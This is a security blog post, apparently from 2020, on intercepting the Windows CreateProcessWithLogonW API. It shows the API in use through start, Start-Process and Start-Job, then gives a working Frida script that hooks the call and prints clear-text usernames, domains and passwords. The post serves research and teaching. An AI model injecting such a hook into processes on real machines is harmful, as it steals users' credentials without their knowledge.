---
layout: single
title: Hooking CreateProcessWithLogonW with Frida
date: 2020-2-22
classes: wide
header:
  teaser: /assets/images/APIHooking/Start.jpg
---

Introduction
------------
Following [b33f](https://twitter.com/FuzzySec) most recent [Patreon](https://www.patreon.com/FuzzySec) session titled `RDP hooking from POC to PWN` where he talks about API hooking in general and then discuss in details RDP hooking ([RdpThief](https://www.mdsec.co.uk/2019/11/rdpthief-extracting-clear-text-credentials-from-remote-desktop-clients/)) research published in 2019 by [@0x09AL](https://twitter.com/0x09al), I've decided to learn more about the subject as it seemed intriguing from an offensive research standpoint. In essence, API hooking is the process by which we can intercept and potentially modify the behavior and flow of API calls. In this blog we will be looking at capturing data pertaining to API calls for the most part.

Tooling
-------
We will be using the following tools:

* [API Monitor](http://www.rohitab.com/apimonitor) tool which is a free software that lets you monitor and control API calls made by applications and services according to the website.
* [Fermion](https://github.com/FuzzySecurity/Fermion) wrapper for [Frida](https://github.com/frida) or [frida-node](https://github.com/frida/frida-node) rather exposing the ability to inject [Frida](https://github.com/frida) scripts into processes using a single UI. 

Target
------
While reading through chapter 3 of Windows Internals book, I noticed a mention of the [CreateProcessWithLogonW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) API which could be used by programs and/or utilities that offer execution in the context of a different user such as `runas` command-line utility. Moreover, examining this function API documentation on MSDN I found that it takes clear-text password for a given user account as parameter amongest others which makes it even more interesting. At this point I thought this is something worth exploring and started targeting commands that make use of said API. The following is list of few commands I tested:

  
Start
-----
As the name suggest, the [start](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/start) command enables a user to open a separate window from the Windows command line. Let's execute the below command to spawn command prompt as a different user while running API Monitor in the background.

![](/assets/images/APIHooking/Start.PNG)

We notice call to [CreateProcessWithLogonW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) API which holds the credential values we just entered in the first and second parameters.

![](/assets/images/APIHooking/APIMon1.PNG)

Start-Process
--------------
The [Start-Process](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/start-process?view=powershell-7) cmdlet starts one or more processes on the local computer such as starting process using alternate credentials amongest other things.

![](/assets/images/APIHooking/Start-Process.JPG)

Again we search for call to [CreateProcessWithLogonW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) API and examine the parameters as shown below.

![](/assets/images/APIHooking/APIMon2.JPG)

Start-Job
---------
The last cmdlet we're going to test is [Start-Job](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/start-job?view=powershell-7) which is used to run jobs in the background. In this case, we're going to invoke basic powershell script to mix things up.

```powershell
$username = "lowpriv"
$password = "Passw0rd!"
$securePassword = ConvertTo-SecureString  -String $password -AsPlainText -Force
$Creds = New-Object System.Management.Automation.PSCredential -ArgumentList ($username, $securePassword)
Start-Job -ScriptBlock {Get-Process Explorer} -Credential $Creds
```

And we get the same result.

![](/assets/images/APIHooking/APIMon3.JPG)

Frida Script
------------
I've put together basic [Frida](https://github.com/frida) script that hooks the [CreateProcessWithLogonW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) API and then extract clear-text credentials.

```javascript
// This script extract clear-text passwords by hooking CreateProcessWithLogonW function API.
//------------------------------------------------------------------------------------------

// https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw
var pCreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW')

Interceptor.attach(pCreateProcessWithLogonW, {
    onEnter: function (args) {
        send("[+] CreateProcessWithLogonW API hooked!");
        // Save the following arguments for OnLeave
        this.lpUsername = args[0];
        this.lpDomain = args[1];
        this.lpPassword = args[2];
        this.lpApplicationName = args[4];
        this.lpCommandLine =args[5];
    },
    onLeave: function (args) {
        send("[+] Retrieving argument values..");
        send("=============================");
        send("Username    : " + this.lpUsername.readUtf16String());
        send("Domain      : " + this.lpDomain.readUtf16String());
        send("Password    : " + this.lpPassword.readUtf16String());
        send("Application : " + this.lpApplicationName.readUtf16String());
        send("Commandline : " + this.lpCommandLine.readUtf16String());
        send("=============================");
    }
});
```

Let's test it.

![](/assets/images/APIHooking/Demo.gif)

Conclusion
----------
I believe this post serves as a gentle introduction to API hooking and I'm sure I missed a few other commands that make use of [CreateProcessWithLogonW](https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createprocesswithlogonw) API behind the scenes ;D. I don't know wether this is useful from post-exploitation standpoint and would rather leave it to the reader to decide. Lastly, I would like to thank [@h0mbre_](https://twitter.com/h0mbre_) for reviewing this post and hope this was a good read.
